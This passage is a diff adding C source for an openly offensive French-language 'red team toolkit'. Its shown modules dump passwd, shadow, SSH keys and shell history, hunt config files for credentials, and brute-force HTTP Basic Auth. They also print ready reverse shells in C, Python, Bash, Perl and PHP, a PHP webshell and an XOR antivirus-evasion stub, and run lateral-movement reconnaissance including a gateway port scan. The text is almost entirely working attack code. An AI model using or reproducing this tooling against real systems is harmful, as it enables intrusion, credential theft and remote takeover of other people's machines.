+    system("ss -tlnpu 2>/dev/null || netstat -tlnpu 2>/dev/null");
+}
+
+static void postex_running_processes(void) {
+    HEAD; printf("Processus en cours:\n");
+    system("ps aux 2>/dev/null | head -30");
+}
+
+static void postex_interesting_files(void) {
+    HEAD; printf("Fichiers intéressants récents (7j):\n");
+    system("find /home /root /tmp /var/www /opt /srv 2>/dev/null "
+           "-newer /etc/passwd -type f -not -path '*/proc/*' "
+           "2>/dev/null | head -40");
+    HEAD; printf("Fichiers config avec credentials potentiels:\n");
+    system("grep -rl 'password\\|passwd\\|secret\\|token\\|api_key' "
+           "/etc /var/www /opt /home 2>/dev/null | head -20");
+}
+
+static void module_postex(void) {
+    printf(MAG "\n" BANNER_LINE "\n");
+    printf("  MODULE: POST-EXPLOITATION\n");
+    printf(BANNER_LINE "\n\n" RST);
+
+    postex_system_info();           printf("\n");
+    postex_dump_passwd();           printf("\n");
+    postex_dump_shadow();           printf("\n");
+    postex_ssh_keys();              printf("\n");
+    postex_env();                   printf("\n");
+    postex_history();               printf("\n");
+    postex_network_connections();   printf("\n");
+    postex_running_processes();     printf("\n");
+    postex_interesting_files();     printf("\n");
+}
+
+/* ============================================================
+ *  SECTION 8 - BRUTE FORCE HTTP BASIC AUTH
+ * ============================================================ */
+
+/* Encode base64 (pour Authorization: Basic) */
+static const char b64_chars[] =
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+static void base64_encode(const unsigned char *in, size_t in_len, char *out) {
+    size_t i = 0, j = 0;
+    while (i < in_len) {
+        unsigned char b0 = in[i++];
+        unsigned char b1 = (i < in_len) ? in[i++] : 0;
+        unsigned char b2 = (i < in_len) ? in[i++] : 0;
+        out[j++] = b64_chars[b0 >> 2];
+        out[j++] = b64_chars[((b0 & 3) << 4) | (b1 >> 4)];
+        out[j++] = (i - 1 < in_len || in_len % 3 > 1) ? b64_chars[((b1 & 0xf) << 2) | (b2 >> 6)] : '=';
+        out[j++] = (i - 1 < in_len || in_len % 3 > 2) ? b64_chars[b2 & 0x3f] : '=';
+    }
+    out[j] = '\0';
+}
+
+static int http_basic_auth_try(const char *host, int port,
+                                const char *path,
+                                const char *user, const char *pass) {
+    int sock;
+    struct sockaddr_in sa;
+    char request[MAX_LINE * 2];
+    char response[MAX_LINE];
+    char creds[512];
+    char b64[700];
+
+    snprintf(creds, sizeof creds, "%s:%s", user, pass);
+    base64_encode((unsigned char*)creds, strlen(creds), b64);
+
+    snprintf(request, sizeof request,
+        "GET %s HTTP/1.0\r\n"
+        "Host: %s\r\n"
+        "Authorization: Basic %s\r\n"
+        "User-Agent: Mozilla/5.0\r\n"
+        "Connection: close\r\n\r\n",
+        path, host, b64);
+
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return -1;
+
+    /* Timeout */
+    struct timeval tv = {3, 0};
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
+    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof tv);
+
+    struct hostent *he = gethostbyname(host);
+    if (!he) { close(sock); return -2; }
+
+    sa.sin_family = AF_INET;
+    sa.sin_port   = htons(port);
+    memcpy(&sa.sin_addr, he->h_addr, he->h_length);
+
+    if (connect(sock, (struct sockaddr*)&sa, sizeof sa) < 0) {
+        close(sock); return -3;
+    }
+    send(sock, request, strlen(request), 0);
+    int n = recv(sock, response, sizeof response - 1, 0);
+    close(sock);
+    if (n <= 0) return -4;
+    response[n] = '\0';
+
+    /* Cherche HTTP 200 ou 301 (succès), 401 (échec) */
+    if (strstr(response, "HTTP/1.") &&
+        !strstr(response, " 401 ") &&
+        !strstr(response, " 403 ")) {
+        return 1; /* succès */
+    }
+    return 0;
+}
+
+static void module_brute(const char *url, const char *wordlist_path) {
+    printf(MAG "\n" BANNER_LINE "\n");
+    printf("  MODULE: BRUTE FORCE HTTP BASIC AUTH\n");
+    printf(BANNER_LINE "\n\n" RST);
+
+    /* Parse URL: http://host:port/path */
+    char host[MAX_HOST] = "localhost";
+    int  port = 80;
+    char path[MAX_PATH] = "/";
+
+    /* Simple parser */
+    const char *p = url;
+    if (strncmp(p, "http://", 7) == 0) p += 7;
+    else if (strncmp(p, "https://", 8) == 0) { p += 8; port = 443; }
+
+    char *tmp = strdup(p);
+    char *slash = strchr(tmp, '/');
+    if (slash) { strncpy(path, slash, sizeof path - 1); *slash = '\0'; }
+    char *colon = strchr(tmp, ':');
+    if (colon) { port = atoi(colon + 1); *colon = '\0'; }
+    strncpy(host, tmp, sizeof host - 1);
+    free(tmp);
+
+    INFO; printf("Cible: %s:%d%s\n", host, port, path);
+    INFO; printf("Wordlist: %s\n\n", wordlist_path);
+
+    FILE *wf = fopen(wordlist_path, "r");
+    if (!wf) {
+        ERR; printf("Impossible d'ouvrir la wordlist: %s\n", wordlist_path);
+        INFO; printf("Format attendu: user:pass (une par ligne)\n");
+        return;
+    }
+
+    char line[512];
+    long tries = 0;
+
+    /* Utilisateurs courants à tester */
+    const char *common_users[] = {"admin","root","administrator","user","test",NULL};
+
+    while (fgets(line, sizeof line, wf)) {
+        line[strcspn(line, "\n\r")] = 0;
+        if (!line[0] || line[0] == '#') continue;
+
+        char *user = line;
+        char *pass = strchr(line, ':');
+
+        if (!pass) {
+            /* Si pas de ':', on teste le mot comme password pour les users communs */
+            for (int i = 0; common_users[i]; i++) {
+                tries++;
+                int r = http_basic_auth_try(host, port, path, common_users[i], line);
+                if (r == 1) {
+                    OK; printf(GRN "CREDENTIALS TROUVÉS: %s:%s\n" RST, common_users[i], line);
+                    fclose(wf);
+                    return;
+                }
+                printf(YEL "  [%ld] Essai %s:%s\r" RST, tries, common_users[i], line);
+                fflush(stdout);
+            }
+        } else {
+            *pass++ = '\0';
+            tries++;
+            int r = http_basic_auth_try(host, port, path, user, pass);
+            if (r == 1) {
+                OK; printf(GRN "CREDENTIALS TROUVÉS: %s:%s\n" RST, user, pass);
+                fclose(wf);
+                return;
+            }
+            printf(YEL "  [%ld] Essai %s:%s\r" RST, tries, user, pass);
+            fflush(stdout);
+        }
+    }
+    fclose(wf);
+    printf("\n");
+    WARN; printf("Aucun credential valide trouvé après %ld essais.\n", tries);
+}
+
+/* ============================================================
+ *  SECTION 9 - GÉNÉRATION DE PAYLOADS
+ * ============================================================ */
+
+static void payload_gen_c(const char *ip, int port) {
+    printf(CYN "\n/* ─── Reverse Shell en C ─── */\n" RST);
+    printf("#include <stdio.h>\n#include <sys/socket.h>\n");
+    printf("#include <netinet/in.h>\n#include <arpa/inet.h>\n\n");
+    printf("int main(){\n");
+    printf("    int s=socket(AF_INET,SOCK_STREAM,0);\n");
+    printf("    struct sockaddr_in a={AF_INET,__bswap_16(%d),{inet_addr(\"%s\")}};\n", port, ip);
+    printf("    connect(s,(struct sockaddr*)&a,sizeof a);\n");
+    printf("    dup2(s,0); dup2(s,1); dup2(s,2);\n");
+    printf("    execl(\"/bin/sh\",\"sh\",\"-i\",NULL);\n");
+    printf("}\n");
+    INFO; printf("Compiler: gcc -o shell shell.c && ./shell\n");
+}
+
+static void payload_gen_python(const char *ip, int port) {
+    printf(CYN "\n# ─── Reverse Shell Python3 ───\n" RST);
+    printf("import socket,subprocess,os\n");
+    printf("s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n");
+    printf("s.connect((\"%s\",%d))\n", ip, port);
+    printf("os.dup2(s.fileno(),0)\n");
+    printf("os.dup2(s.fileno(),1)\n");
+    printf("os.dup2(s.fileno(),2)\n");
+    printf("subprocess.call([\"/bin/sh\",\"-i\"])\n");
+    INFO; printf("Exécuter: python3 payload.py\n");
+}
+
+static void payload_gen_bash(const char *ip, int port) {
+    printf(CYN "\n# ─── Reverse Shell Bash ───\n" RST);
+    printf("bash -i >& /dev/tcp/%s/%d 0>&1\n\n", ip, port);
+    printf("# Ou via /dev/tcp directement:\n");
+    printf("exec 5<>/dev/tcp/%s/%d; cat <&5 | while read l; do $l 2>&5 >&5; done\n", ip, port);
+}
+
+static void payload_gen_perl(const char *ip, int port) {
+    printf(CYN "\n# ─── Reverse Shell Perl ───\n" RST);
+    printf("perl -e 'use Socket;$i=\"%s\";$p=%d;\n", ip, port);
+    printf("socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\n");
+    printf("connect(S,sockaddr_in($p,inet_aton($i)));\n");
+    printf("open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");\n");
+    printf("exec(\"/bin/sh -i\");'\n");
+}
+
+static void payload_gen_php(const char *ip, int port) {
+    printf(CYN "\n/* ─── Web Shell PHP ─── */\n" RST);
+    printf("<?php\n");
+    printf("// Webshell basique\n");
+    printf("if(isset($_GET['cmd'])){ system($_GET['cmd']); }\n\n");
+    printf("// Reverse shell\n");
+    printf("$sock=fsockopen(\"%s\",%d);\n", ip, port);
+    printf("$proc=proc_open(\"/bin/sh -i\",\n");
+    printf("  [0=>$sock,1=>$sock,2=>$sock],$pipes);\n");
+    printf("?>\n");
+}
+
+static void payload_gen_xor_encoder(void) {
+    printf(CYN "\n/* ─── XOR Encoder de payload ─── */\n" RST);
+    printf("/* Encode un shellcode pour bypass basique AV */\n\n");
+    printf("void xor_encode(unsigned char *buf, size_t len, unsigned char key) {\n");
+    printf("    for (size_t i = 0; i < len; i++) buf[i] ^= key;\n");
+    printf("}\n\n");
+    printf("/* Stub de déchiffrement en mémoire */\n");
+    printf("void xor_exec(unsigned char *enc, size_t len, unsigned char key) {\n");
+    printf("    unsigned char *buf = mmap(0, len,\n");
+    printf("        PROT_READ|PROT_WRITE|PROT_EXEC,\n");
+    printf("        MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);\n");
+    printf("    memcpy(buf, enc, len);\n");
+    printf("    xor_encode(buf, len, key);\n");
+    printf("    ((void(*)())buf)();\n");
+    printf("}\n");
+}
+
+static void module_payload(const char *ip, int port, const char *type) {
+    printf(MAG "\n" BANNER_LINE "\n");
+    printf("  MODULE: GÉNÉRATION PAYLOAD (%s) → %s:%d\n", type, ip, port);
+    printf(BANNER_LINE "\n\n" RST);
+
+    if (strcmp(type, "c") == 0)    { payload_gen_c(ip, port); }
+    else if (strcmp(type, "py") == 0)   { payload_gen_python(ip, port); }
+    else if (strcmp(type, "bash") == 0) { payload_gen_bash(ip, port); }
+    else if (strcmp(type, "perl") == 0) { payload_gen_perl(ip, port); }
+    else if (strcmp(type, "php") == 0)  { payload_gen_php(ip, port); }
+    else if (strcmp(type, "xor") == 0)  { payload_gen_xor_encoder(); }
+    else {
+        /* Tous les types */
+        payload_gen_bash(ip, port);
+        payload_gen_python(ip, port);
+        payload_gen_perl(ip, port);
+        payload_gen_c(ip, port);
+        payload_gen_php(ip, port);
+        payload_gen_xor_encoder();
+    }
+}
+
+/* ============================================================
+ *  SECTION 10 - MOUVEMENT LATÉRAL
+ * ============================================================ */
+
+static void lateral_arp_table(void) {
+    HEAD; printf("Table ARP (hôtes locaux connus):\n");
+    system("cat /proc/net/arp 2>/dev/null");
+    system("arp -n 2>/dev/null");
+}
+
+static void lateral_routes(void) {
+    HEAD; printf("Table de routage:\n");
+    system("cat /proc/net/route 2>/dev/null");
+    system("ip route 2>/dev/null || route -n 2>/dev/null");
+}
+
+static void lateral_ssh_targets(void) {
+    HEAD; printf("Cibles SSH potentielles (known_hosts):\n");
+    /* Cherche tous les known_hosts */
+    FILE *fp = popen("find /home /root -name 'known_hosts' 2>/dev/null", "r");
+    if (!fp) return;
+    char path[MAX_PATH];
+    while (fgets(path, sizeof path, fp)) {
+        path[strcspn(path, "\n")] = 0;
+        printf(CYN "  [%s]\n" RST, path);
+        /* Affiche les hôtes (hashed ou pas) */
+        FILE *kh = fopen(path, "r");
+        if (!kh) continue;
+        char line[MAX_LINE];
+        while (fgets(line, sizeof line, kh)) {
+            if (line[0] == '#' || line[0] == '\n') continue;
+            /* Extraire juste le nom d'hôte */
+            char *tok = strtok(line, " \t");
+            if (tok) printf("    → %s\n", tok);
+        }
+        fclose(kh);
+    }
+    pclose(fp);
+}
+
+static void lateral_passwd_users(void) {
+    HEAD; printf("Utilisateurs avec shell valide:\n");
+    struct passwd *pw;
+    setpwent();
+    while ((pw = getpwent()) != NULL) {
+        if (strstr(pw->pw_shell, "sh") || strstr(pw->pw_shell, "bash")) {
+            OK; printf("  %-20s UID:%-6d Home: %s  Shell: %s\n",
+                pw->pw_name, pw->pw_uid, pw->pw_dir, pw->pw_shell);
+        }
+    }
+    endpwent();
+}
+
+static void lateral_shared_credentials(void) {
+    HEAD; printf("Recherche credentials réutilisables:\n");
+    /* Fichiers de config courants avec mots de passe */
+    const char *patterns[] = {
+        "find /var/www -name '*.php' -exec grep -l 'password\\|passwd\\|DB_PASS' {} \\;",
+        "find /etc -name '*.conf' -exec grep -l 'password\\|passwd' {} \\; 2>/dev/null",
+        "find /home /root -name '.env' -o -name 'config.yml' -o -name 'database.yml' 2>/dev/null",
+        "grep -r 'password' /etc/mysql/ 2>/dev/null | head -5",
+        NULL
+    };
+    for (int i = 0; patterns[i]; i++) {
+        system(patterns[i]);
+    }
+}
+
+static void lateral_port_scan_internal(void) {
+    HEAD; printf("Scan ports sur gateway (TCP connect rapide):\n");
+
+    /* Détermine la gateway */
+    FILE *fp = popen("ip route | grep default | awk '{print $3}'", "r");
+    char gw[64] = "";
+    if (fp) {
+        fgets(gw, sizeof gw, fp);
+        gw[strcspn(gw, "\n")] = 0;
+        pclose(fp);
+    }
+    if (!gw[0]) { WARN; printf("Gateway introuvable\n"); return; }
+
+    INFO; printf("Gateway détectée: %s\n", gw);
+
+    const int ports[] = {21,22,23,25,53,80,443,445,3306,3389,5432,6379,8080,8443,0};
+
+    struct sockaddr_in sa;
+    sa.sin_family      = AF_INET;
+    sa.sin_addr.s_addr = inet_addr(gw);
+
+    for (int i = 0; ports[i]; i++) {
+        int s = socket(AF_INET, SOCK_STREAM, 0);
+        struct timeval tv = {1, 0};
+        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof tv);
+        sa.sin_port = htons(ports[i]);
+
+        if (connect(s, (struct sockaddr*)&sa, sizeof sa) == 0) {
+            OK; printf("  %s:%d OUVERT\n", gw, ports[i]);
+        }
+        close(s);
+    }
+}
+
+static void module_lateral(void) {
+    printf(MAG "\n" BANNER_LINE "\n");
+    printf("  MODULE: MOUVEMENT LATÉRAL\n");
+    printf(BANNER_LINE "\n\n" RST);
+
+    lateral_passwd_users();         printf("\n");
+    lateral_arp_table();            printf("\n");
+    lateral_routes();               printf("\n");
+    lateral_ssh_targets();          printf("\n");
+    lateral_shared_credentials();   printf("\n");
+    lateral_port_scan_internal();   printf("\n");
+}
+
+/* ============================================================
+ *  MAIN
+ * ============================================================ */
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        print_help();
+        return 1;
+    }
+
+    const char *mod = argv[1];
+
+    /* ── recon ── */
+    if (strcmp(mod, "recon") == 0) {
+        if (argc < 3) { ERR; printf("Usage: ./rtk recon <cible>\n"); return 1; }
+        module_recon(argv[2]);
+
+    /* ── privesc ── */
+    } else if (strcmp(mod, "privesc") == 0) {
+        module_privesc();
+
+    /* ── persist ── */
+    } else if (strcmp(mod, "persist") == 0) {
+        if (argc < 3) { ERR; printf("Usage: ./rtk persist <commande>\n"); return 1; }
+        module_persist(argv[2]);
+
+    /* ── shell ── */
+    } else if (strcmp(mod, "shell") == 0) {
+        if (argc < 5) {
+            ERR; printf("Usage: ./rtk shell <ip> <port> <r|b>\n");
+            INFO; printf("  r = reverse shell vers ip:port\n");
+            INFO; printf("  b = bind shell sur 0.0.0.0:port\n");
+            return 1;
+        }
+        module_shell(argv[2], atoi(argv[3]), argv[4][0]);
+
+    /* ── exfil ── */
+    } else if (strcmp(mod, "exfil") == 0) {
+        if (argc < 4) { ERR; printf("Usage: ./rtk exfil <ip> <port>\n"); return 1; }
+        module_exfil(argv[2], atoi(argv[3]));
+
+    /* ── evasion ── */
+    } else if (strcmp(mod, "evasion") == 0) {
+        module_evasion();
+
+    /* ── postex ── */
+    } else if (strcmp(mod, "postex") == 0) {
+        module_postex();
+
+    /* ── brute ── */
+    } else if (strcmp(mod, "brute") == 0) {
+        if (argc < 4) {
+            ERR; printf("Usage: ./rtk brute <url> <wordlist>\n");
+            INFO; printf("  url      ex: http://192.168.1.1/admin\n");
+            INFO; printf("  wordlist ex: passwords.txt (format user:pass ou juste pass)\n");
+            return 1;
+        }
+        module_brute(argv[2], argv[3]);
+
+    /* ── payload ── */
+    } else if (strcmp(mod, "payload") == 0) {
+        if (argc < 5) {
+            ERR; printf("Usage: ./rtk payload <ip> <port> <type>\n");
+            INFO; printf("  Types: c | py | bash | perl | php | xor | all\n");
+            return 1;
+        }
+        module_payload(argv[2], atoi(argv[3]), argv[4]);
+
+    /* ── lateral ── */
+    } else if (strcmp(mod, "lateral") == 0) {
+        module_lateral();
+
+    } else {
+        ERR; printf("Module inconnu: %s\n\n", mod);
+        print_help();
+        return 1;
+    }
+
+    printf(GRN "\n[✓] Module '%s' terminé.\n" RST, mod);
+    return 0;
+}
